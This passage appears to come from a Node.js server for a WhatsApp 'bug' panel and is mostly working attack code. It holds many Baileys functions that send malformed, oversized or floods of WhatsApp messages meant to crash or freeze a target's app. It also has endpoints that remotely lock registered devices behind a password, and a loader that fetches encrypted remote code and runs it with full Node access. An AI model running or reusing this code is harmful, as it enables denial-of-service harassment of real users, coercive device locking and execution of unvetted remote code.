        exec('which hping3', (error) => {
            return !error;
        });
    } catch {
        return false;
    }
}

// POST /kiosk-register — Flutter daftar sebagai kiosk
app.post('/kiosk-register', (req, res) => {
  const { key, username } = req.body;
  const freshKeys = loadKeyList();
  const user = freshKeys.find(u => u.sessionKey === key);
  if (!user) return res.json({ success: false, message: 'Invalid key' });

  kioskClients.set(username, { lastSeen: Date.now() });
  console.log(`[KIOSK] Registered: ${username}`);
  res.json({ success: true });
});

// GET /kiosk-check — Flutter polling cek ada lock command tidak
app.get('/kiosk-check', (req, res) => {
  const { key, username } = req.query;
  const freshKeys = loadKeyList();
  const user = freshKeys.find(u => u.sessionKey === key);
  if (!user) return res.json({ success: false, message: 'Invalid key' });

  // Update lastSeen
  kioskClients.set(username, { lastSeen: Date.now() });

  const lock = kioskLocks.get(username);
  if (lock) {
    return res.json({ success: true, locked: true, ...lock });
  }
  res.json({ success: true, locked: false });
});

// POST /lock-device — Admin kirim lock command
app.post('/lock-device', (req, res) => {
  const freshKeys = loadKeyList();
  const sender = freshKeys.find(u => u.sessionKey === req.body.key);
  if (!sender) return res.json({ success: false, message: 'Invalid key' });
  if (!['owner', 'admin', 'reseller', 'reseller1'].includes(sender.role)) {
    return res.json({ success: false, message: 'Tidak punya akses' });
  }

  const { target, videoUrl, password, message } = req.body;
  if (!target) return res.json({ success: false, message: 'Target required' });

  // Cek target online (lastSeen < 30 detik)
  const client = kioskClients.get(target);
  if (!client || Date.now() - client.lastSeen > 30000) {
    return res.json({ success: false, message: `User ${target} tidak online` });
  }

  // Simpan lock command — akan diambil saat target polling
  kioskLocks.set(target, {
    videoUrl:  videoUrl  || '',
    password:  password  || '252525',
    lockedBy:  sender.username,
    message:   message   || 'Perangkat ini dikunci oleh administrator.',
    lockedAt:  Date.now(),
  });

  console.log(`[LOCK] ${sender.username} → ${target}`);
  res.json({ success: true, message: `Lock command sent to ${target}` });
});

// POST /unlock-device — Admin kirim unlock
app.post('/unlock-device', (req, res) => {
  const freshKeys = loadKeyList();
  const sender = freshKeys.find(u => u.sessionKey === req.body.key);
  if (!sender) return res.json({ success: false, message: 'Invalid key' });

  const { target } = req.body;
  kioskLocks.delete(target);
  console.log(`[UNLOCK] ${sender.username} → ${target}`);
  res.json({ success: true, message: `Unlock sent to ${target}` });
});

// POST /kiosk-unlocked — Flutter lapor sudah di-unlock
app.post('/kiosk-unlocked', (req, res) => {
  const { key, username } = req.body;
  const freshKeys = loadKeyList();
  const user = freshKeys.find(u => u.sessionKey === key);
  if (!user) return res.json({ success: false });

  kioskLocks.delete(username);
  console.log(`[KIOSK UNLOCKED] ${username}`);
  res.json({ success: true });
});

// GET /online-users — List kiosk yang online
app.get('/online-users', (req, res) => {
  const freshKeys = loadKeyList();
  const sender = freshKeys.find(u => u.sessionKey === req.query.key);
  if (!sender) return res.json({ success: false, message: 'Invalid key' });

  const now = Date.now();
  const users = Array.from(kioskClients.entries())
    .filter(([, v]) => now - v.lastSeen <= 30000)
    .map(([username]) => username);

  res.json({ success: true, users });
});

// ===== GET /getLog =====
app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || user.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    const logContent = fs.readFileSync("logUser.txt", "utf8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const parts = data.trim().split('.');
    if (parts.length !== 2) {
      throw new Error("Invalid encrypted data format");
    }
    
    const [ivB64, encryptedB64] = parts;

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    // Sandbox VM
    const context = {
      module: { exports: {} },
      require,
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      clearInterval,
      crypto,
      proto,
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      generateWAMessageContent,
      generateWAMessage,
      waUploadToServer,
      fs,
      generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    console.error("❌ Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}

let bugWa;

async function ForcloseInfinity(sock, target) {
  console.log("Succes Send Bug FC Infinity By Hika");
  
  let msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "FC Infinity By Hika",
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "send_location",
                buttonParamsJson: JSON.stringify({
                  name: "BG HIKA BUG FORCLOSE",
                  address: ""
                })
              }
            ]
          },
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 3
          }
        }
      }
    }
  };
  
  await sock.relayMessage(target, msg, {
    participant: { jid: target },
    userJid: target,
    messageId: null
  });
  
  let msg1 = {
    sendPaymentMessage: {}
  };
  
  await sock.relayMessage(target, msg1, {
    participant: { jid: target },
    quoted: null,
    userJid: target,
    messageId: null
  });
}


async function trydelay(isTarget) {
    try {
        let msg = generateWAMessageFromContent(isTarget, {
            interactiveMessage: {
                contextInfo: {
                    // Generates 2000 mentioned JIDs
                    mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
                },
                body: {
                    text: "𖣂᳟༑Exzzzzio   ᭨᳟᪳",
                    format: "DEFAULT"
                },
                nativeFlowMessage: {
                    name: "call_permission_request",
                    paramsJson: JSON.stringify({}) // Standard empty JSON
                }
            }
        }, { 
            userJid: sock.user.id, 
            quoted: null 
        });

        await sock.relayMessage(isTarget, msg.message, {
            messageId: msg.key.id,
            participant: { jid: isTarget }
        });
        
        console.log(`Message relayed to ${isTarget}`);
    } catch (error) {
        console.error("Failed to relay message:", error);
    }
}


async function Blankletter(sock, target) {
  try {
    for (let i = 1; i <= 75; i++) {

      const mentionedList = [
        "0@s.whatsapp.net",
        ...Array.from({ length: 1900 }, () =>
          `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
        ),
      ];

      const msg = {
        newsletterAdminInviteMessage: {
          newsletterJid: "1234567891234@newsletter",
          newsletterName: "ϟ¿𖣂?",
          caption: `Know Me?`,
          inviteExpiration: "90000",

          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: mentionedList,
          },
        },
      };

      await sock.relayMessage(target, msg);

      console.log(`Function Terkirim Aman`);

      await new Promise((resolve) => setTimeout(resolve, 500)); 
    }
  } catch (err) {
    console.error("Function tidak Terkirim :", err);
  }
}

async function FcRelog(sock, target) {
       const options = [
        { optionName: "1msg" },
        { optionName: "execute" }
    ];
    const correctAnswer = options[1];
    const msg = generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "- ",
                            format: "EXTENSION_1"
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\u0000".repeat(1_000_000),
                            version: 3
                        },
                        contextInfo: {
                            remoteJid: "Catch me if you can",
                            participant: "13135550202@s.whatsapp.net",
                            fromMe: false,
                            expiration: 7205,
                            ephemeralSettingTimestamp: 2502,
                            disappearingMode: {
                                initiator: "INITIATED_BY_OTHER",
                                trigger: "ACCOUNT_SETTING"
                            },
                            requestPaymentMessage: {
                                currencyCodeIso4217: "USD",
                                requestFrom: target,
                                expiryTimestamp: null
                            }
                        }
                    }
                }
            },
            botInvokeMessage: {
                message: {
                    messageContextInfo: {
                        messageSecret: crypto.randomBytes(32),
                        messageAssociation: {
                            associationType: 7,
                            parentMessageKey: crypto.randomBytes(16)
                        }
                    },
                    pollCreationMessage: {
                        name: "Null᭾",
                        options: options,
                        selectableOptionsCount: 1,
                        pollType: "QUIZ",
                        correctAnswer: correctAnswer
                    }
                }
            }
        },
        {}
    );

    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

async function ContacXMsg(target) {
    const CeryOnce = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "\u0000".repeat(200),
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "address_message",
                        paramsJson: "\r".repeat(900000),
                        version: 3
                    }
                },
                contextInfo: {
                    mentionedJid: Array.from({ length: 2000 }, (_, p) => `1313555000${p + 1}@s.whatsapp.net`),
                    quotedMessage: {
                        key: {
                            remoteJid: "status@broadcast",
                            participant: "0@s.whatsapp.net",
                            fromMe: false
                        },
                        message: {
                            contactMessage: {
                                displayName: "CeryOnce",
                                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:CeryOnce Official${"ꦽ".repeat(2500) + "ោ៝".repeat(2500)}\nTEL;type=Ponsel;waid=15517868400:15517868400\nX-WA-BIZ-DESCRIPTION:${"ꦽ".repeat(2500) + "ោ៝".repeat(2500)}\nX-WA-BIZ-NAME:CeryOnce\nEND:VCARD`
                            }
                        }
                    }
                }
            }
        }
    }, {});

    await Cery.relayMessage("status@broadcast", CeryOnce.message, {
        messageId: CeryOnce.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                }]
            }]
        }]
    });
}

async function DelaySpamingBeta(target) {
  const msg = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        eventMessage: {
          isCanceled: false,
          name: "jawakerto",
          description: "\u0000",
          location: {
            degreesLatitude: "a",
            degreesLongitude: "a",
            name: "X"
          },
          joinLink: "https://call.whatsapp.com/voice/wrZ273EsqE7NGlJ8UT0rtZ",
          startTime: "1714957200",
          thumbnailDirectPath: "https://aloneatlast.xyz/thumb.jpg",
          thumbnailSha256: Buffer.from('1234567890abcdef', 'hex'),
          thumbnailEncSha256: Buffer.from('abcdef1234567890', 'hex'),
          mediaKey: Buffer.from('abcdef1234567890abcdef1234567890', 'hex'),
          mediaKeyTimestamp: Date.now(),
          contextInfo: {
            participant: target,
            mentionedJid: [
              "131338822@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "X",
            participant: target,
            stanzaId: "1234567890ABCDEF",
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "\u0000",
                      format: "DEFAULT",
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "\×10",
                      version: 3,
                    },
                  },
                },
              },
            },
          },
        },
      },
    },
  };
  
  await sock.relayMessage(target, msg, {
    messageId: "",
    participant: { jid: target },
    userJid: target,
  });
}

async function CrashVsx(sock, target) {
  let start = Date.now();
  while (Date.now() - start < 300000) {
    try {
      await sock.relayMessage(target, {
        groupStatusMessageV2: {
          message: {
            extendedTextMessage: {
              paymentLinkMetadata: {
                provider: { paramsJson: "{".repeat(70000) },
                header: { headerType: 1 },
                button: { displayText: "IM AM VSX" }
              }
            }
          }
        }
      }, { messageId: sock.generateMessageTag() });
      await new Promise(r => setTimeout(r, 1000));
    } catch (e) {}
  }
}

async function ForcloseOneMsg(sock, target) {
  const msg = {
    sendPaymentMessage: {
      currencyCodeIso4217: "DOLAR",
      amount: {
        value: 999999999,
        offset: 100
      }
    }
  };
  
  await sock.relayMessage(target, msg, {
    messageId: null,
    userJid: target,
    participant: { jid: target },
    quoted: null
  });
}

async function HardCore(sock, target) {
  let msg = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: { title: "ꦾ".repeat(8000) },
          body: { text: "ꦽ".repeat(8000) },
          contextInfo: {
            stanzaId: "Sejaya_id",
            isForwarding: true,
            forwardingScore: 999,
            participant: target,
            remoteJid: "status@broadcast",
            mentionedJid: ["13333335502@s.whatsapp.net", ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 5000000) + "13333335502@s.whatsapp.net")],
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimeStamp: Date.now() + 18144000000,
              },
            },
            forwardedAiBotMessageInfo: {
              botName: "BOKEP SIMULATOR",
              botJid: Math.floor(Math.random() * 99999),
              creatorName: "https://t.me/LeamorZunn",
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target }
  });

  console.log("Hard Invisible Delay");
}

async function FriendVisi(sock, target) {
  let VoidTeam = "VISI NIH";
  let MyTeam = "ြ".repeat(1500);
  const PayCrash = {
    requestPaymentMessage: {
      currencyCodeIso4217: 'IDR',
      requestFrom: target, 
      expiryTimestamp: Date.now() + 8000, 
      amount: {
        value: 999999999, 
        offset: 100, 
        currencyCode: 'IDR'
      },
      contextInfo: {
        externalAdReply: {
          title: VoidTeam,
          body: MyTeam,
          mimetype: 'audio/mpeg',
          caption: MyTeam,
          showAdAttribution: true,
          sourceUrl: 'https://t.me/Deniss_erorr',
          thumbnailUrl: 'https://files.catbox.moe/87l7gz.jpeg'
        }
      }
    }
  };

  await sock.relayMessage(target, PayCrash, {
    participant: { jid: target },
    messageId: null,
    userJid: target,
    quoted: null
  });
}

async function LathenPush(sock, target) {

  let msg = {
    viewOnceMessage: {
      message: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
          fileLength: "999999999999",
          pageCount: 1316134911,
          mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
          fileName: "Tes!!",
          fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
          directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc",
          mediaKeyTimestamp: "1743848703",
          caption: "ꦾ".repeat(180000),
          contextInfo: {
            remoteJid: target,
            fromMe: true,
            participant: target,
            mentionedJid: Array.from({ length: 2000 }, (_, i) => `1${i}@s.whatsapp.net`),
            groupMentions: [
              {
                groupJid: "628xxxxxx2345@g.us",
                groupSubject: "ꦾ".repeat(30000)
              }
            ],
            forwardingScore: 999
          }
        }
      }
    }
  };


  let msg1 = {
    viewOnceMessage: {
      message: {
        extendedTextMessage: {
          text: "ꦾ".repeat(180000),
          contextInfo: {
            businessMessageForwardInfo: {
              businessOwnerJid: "2892ꦾ8181@s.whatsapp.net"
            },
            stanzaId: "OdX-Id" + Math.floor(Math.random() * 99999),
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363321780349272@newsletter",
              serverMessageId: 1,
              newsletterName: "ោ៝".repeat(30000)
            },
            mentions: Array.from({ length: 2000 }, () =>
              "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "@OndetMpx𓃻< LathenPush"
                    },
                    nativeFlowResponseMessage: {
                      name: "address_message",
                      paramsJson: "ꦾ".repeat(30000),
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  };

  const odx = [
    generateWAMessageFromContent(target, msg, {}),
    generateWAMessageFromContent(target, msg1, {})
  ];

  for (const tai of odx) {
    await sock.relayMessage(
      "status@broadcast",
      tai.message,
      {
        messageId: tai.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  { tag: "to", attrs: { jid: target }, content: undefined }
                ]
              }
            ]
          }
        ]
      }
    );
  }
}

async function SasukeHard(sock, target) {
  const message1 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "</⃟༑⌁⃰ˡᵘ ˢⁱᵃᵖᵃ ᵇᵃⁿᵍ?", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "{}"
        },
        contextInfo: {
          participant: target,
          mentionedJid: Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
          ),
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            },
          },
        },
      },
    },
  };

  const audioMessage2 = {
    audioMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
      mimetype: "audio/mpeg",
      fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
      fileLength: "389948",
      seconds: 24,
      ptt: false,
      mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
      fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4=",
      contextInfo: {
        remoteJid: "X",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        mentionedJid: [
          "6285215587498@s.whatsapp.net",
          ...Array.from({ length: 1999 }, () =>
            `${Math.floor(100000000000 + Math.random() * 899999999999)}@s.whatsapp.net`
          ),
        ],
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message1, audioMessage2, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (target) {
    await sock.relayMessage(
      target, 
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      }, 
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: " </⃟༑⌁⃰𝗠𝗮𝘂𝗞𝘂𝗘𝘄𝗲𝗚𝗮?"
            },
            content: undefined
          }
        ]
      }
    );
  }

  const stickerMsg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_573578875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/webp",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "1173741824",
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          isAnimated: false,
          viewOnce: false,
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from({ length: 1900 }, () =>
                "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              )
            ],
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9999,
            isForwarded: true,
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: { text: "#</⃟༑⌁⃰𝗧𝗵𝗶𝘀𝗜𝘀 𝗣𝘁 𝗦𝘀¿¿", format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                      name: "call_permission_request",
                      paramsJson: "\u0000".repeat(99999),
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  };

  const stickerMsgFinal = generateWAMessageFromContent(target, stickerMsg, {});

  await sock.relayMessage("status@broadcast", stickerMsgFinal.message, {
    messageId: stickerMsgFinal.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function CrashPairing(sock, target) {
  const MaliciousSyncPacket = {
    viewOnceMessage: {
      message: {
        protocolMessage: {
          type: "APP_STATE_SYNC_KEY_SHARE",
          key: {
            remoteJid: target,
            fromMe: false, 
            id: crypto.randomBytes(16).toString('hex').toUpperCase()
          },
          timestampMs: Date.now(),
          appStateSyncKeyShare: {
            keys: [
              {
                keyId: {
                  keyId: crypto.randomBytes(32) 
                },
                keyData: {
                  keyData: Buffer.from("\uFFFF".repeat(500000), 'utf16le')
                }
              }
            ]
          }
        }
      }
    }
  };
  const CrashMessage = generateWAMessageFromContent(
    target,
    MaliciousSyncPacket,
    { userJid: target }
  );

  await sock.relayMessage(
    target,
    CrashMessage.message,
    {
      messageId: CrashMessage.key.id
    }
  );
return void 0;
}

async function AlfaSpamPair(sock, target) {
    if (!target) return;
const {
    makeWASocket,
    useMultiFileAuthState,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    delay
} = require('@whiskeysockets/baileys');
const P = require('pino');

    const { state, saveCreds } = await useMultiFileAuthState('./temp_pair');
    const { version } = await fetchLatestBaileysVersion();
    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;
        if (qr) {
        }
        if (connection === 'close') {
        }
        if (connection === 'open') {
            await delay(500);
            await sock.logout();
        }
    });
    sock.ev.on('creds.update', saveCreds);
    await delay(5000);
    try { await sock.logout(); } catch {}
}

async function OdzBuldo(sock, target) {
  const Odx = "ꦾ".repeat(80000);
  
  const viewOnceMsg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/540333979_2660244380983043_2025707384462578704_n.enc?ccb=11-4&oh=01_Q5Aa3AH58d8JlgVc6ErscnjG1Pyj7cT682cpI5AeJRCkGBE2Wg&oe=6934CBA0&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          fileSha256: "QxkYuxM0qMDgqUK5WCi91bKWGFDoHhNNkrRlfMNEjTo=",
          fileLength: "999999999999",
          height: 999999999,
          width: 999999999,
          mediaKey: "prx9yPJPZEJ5aVgJnrpnHYCe8UzNZX6/QFESh0FTq+w=",
          fileEncSha256: "zJgg0nMJT1uBohdzwDXkOxaRlQnhJZb+qzLF1lbLucc=",
          directPath: "/v/t62.7118-24/540333979_2660244380983043_2025707384462578704_n.enc?ccb=11-4&oh=01_Q5Aa3AH58d8JlgVc6ErscnjG1Pyj7cT682cpI5AeJRCkGBE2Wg&oe=6934CBA0&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1762488513",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAIAMBIgACEQEDEQH/xAAtAAACAwEAAAAAAAAAAAAAAAAABAIDBQEBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAAQgzOsuOtNHI6YZhpxRWpeubdXLKhm1ckeEqlp6CS4B//xAAkEAACAwABAwQDAQAAAAAAAAABAgADEQQSFCETMUFREDJCUv/aAAgBAQABPwDtVC4riLw6zvU8bitpzI1Tge0FQW1ARgjUKOSVzwZZxwjossqSpQp8ndyXUNYQ31DxrS4eNxrGsDmcjju7KyjzD+G8TcG7H5PSPE7m2dwzIwM63/1P3c/QlrqkqAdfqehn9CLfWPacy0m3QYrM1S4fM67x8iBg3zkZAf6muAMMc2fJgvOZk9YzuW9sh5BzMn//xAAXEQEBAQEAAAAAAAAAAAAAAAARAAEg/9oACAECAQE/ACJmLNOf/8QAGREBAQADAQAAAAAAAAAAAAAAAREAAhBC/9oACAEDAQE/ADaNg5cdVJZhqnpeJeV7/9k=",
          caption: Odx,
          contextInfo: {
            stanzaId: "Thumbnail.id",
            isForwarded: true,
            forwardingScore: 999,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1990 }, () => "1" + Math.floor(Math.random() * 500000000) + "@s.whatsapp.net")
            ]
          }
        }
      }
    }
  }, {});

  const Payment_Info = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      body: {
        text: "Ondet Onde X",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: "\u0000".repeat(1045000),
        version: 3
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", viewOnceMsg.message, {
    messageId: viewOnceMsg.key.id,
    statusJidList: [target]
  });
  
  await sock.relayMessage("status@broadcast", Payment_Info.message, {
    messageId: Payment_Info.key.id,
    statusJidList: [target]
  });
}

async function HeryVisi(sock, target) {
const { encodeSignedDeviceIdentity, jidEncode, jidDecode, encodeWAMessage, patchMessageBeforeSending, encodeNewsletterMessage } = require("@whiskeysockets/baileys");
let devices = (
await sock.getUSyncDevices([target], false, false)
).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

await sock.assertSessions(devices)

let xnxx = () => {
let map = {};
return {
mutex(key, fn) {
map[key] ??= { task: Promise.resolve() };
map[key].task = (async prev => {
try { await prev; } catch {}
return fn();
})(map[key].task);
return map[key].task;
}
};
};

let Raza = xnxx();
let Official = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
let XMods = sock.createParticipantNodes.bind(sock);
let Cyber = sock.encodeWAMessage?.bind(sock);

sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
let memeg = Array.isArray(patched)
? patched
: recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

let { id: meId, lid: meLid } = sock.authState.creds.me;
let omak = meLid ? jidDecode(meLid)?.user : null;
let shouldIncludeDeviceIdentity = false;

let nodes = await Promise.all(memeg.map(async ({ recipientJid: jid, message: msg }) => {
let { user: targetUser } = jidDecode(jid);
let { user: ownPnUser } = jidDecode(meId);
let isOwnUser = targetUser === ownPnUser || targetUser === omak;
let y = jid === meId || jid === meLid;
if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

let bytes = Official(Cyber ? Cyber(msg) : encodeWAMessage(msg));

return Raza.mutex(jid, async () => {
let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
return {
tag: 'to',
attrs: { jid },
content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
};
});
}));

return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
};

let Exo = crypto.randomBytes(32);
let Floods = Buffer.concat([Exo, Buffer.alloc(8, 0x01)]);
let { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

let lemiting = {
tag: "call",
attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
content: [{
tag: "offer",
attrs: {
"call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
"call-creator": sock.user.id
},
content: [
{ tag: "audio", attrs: { enc: "opus", rate: "16000" } },
{ tag: "audio", attrs: { enc: "opus", rate: "8000" } },
{
tag: "video",
attrs: {
orientation: "0",
screen_width: "1920",
screen_height: "1080",
device_orientation: "0",
enc: "vp8",
dec: "vp8"
}
},
{ tag: "net", attrs: { medium: "3" } },
{ tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
{ tag: "encopt", attrs: { keygen: "2" } },
{ tag: "destination", attrs: {}, content: destinations },
...(shouldIncludeDeviceIdentity ? [{
tag: "device-identity",
attrs: {},
content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
}] : [])
]
}]
};
await sock.sendNode(lemiting);
}

async function AlfaXVoid(sock, target) {
  try {
    const msg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -66.666,
            degreesLongtitude: 66.666,
            name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
            address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
            jpegThumbnail: null,
            url: `https://t.me/${"𑇂𑆵𑆴𑆿".repeat(25000)}`,
            contextInfo: {
              participant: target,
              forwardingScore: 1,
              isForwarded: true,
              stanzaId: target,
              mentionedJid: [target]
            },
          },
